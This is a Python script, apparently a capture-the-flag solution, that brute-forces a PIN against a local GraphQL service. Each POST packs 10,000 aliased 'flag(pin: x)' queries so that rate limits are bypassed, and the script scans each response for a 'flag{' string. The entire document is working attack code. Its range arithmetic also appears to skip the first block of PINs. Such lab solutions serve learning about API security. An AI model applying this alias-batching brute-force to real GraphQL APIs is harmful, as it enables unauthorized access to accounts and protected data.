import requests

headers = {
    'Content-Type': 'text/plain;charset=UTF-8',
}

for i in range(10):
    MAX_NUM = 10000 # Max Request Size
    INI = (i*MAX_NUM)+MAX_NUM
    print(f'=========> Brute Range: {INI} - {INI+MAX_NUM-1}')
    QUERIES = '\n'.join([f'f{x}: flag(pin: {x})' for x in range(INI,INI+MAX_NUM)])
    OPERATION = 'query Getflag { ' + QUERIES +' }'

    response = requests.post('http://127.0.0.1:7777/', headers=headers, data=OPERATION)

    result = response.text.replace(',', ',\n')
    print(f'Status: {response.status_code}')

    FLAG_PREFIX = 'flag{'
    index = result.find(FLAG_PREFIX)
    if index > 0:
        flag_ini = index
        flag_end = result.index('}', index+len(FLAG_PREFIX)) + 1
        flag = result[index:flag_end]
        print(f'Flag is {flag}')
        break
    else:
        print('Not yet!')
    print()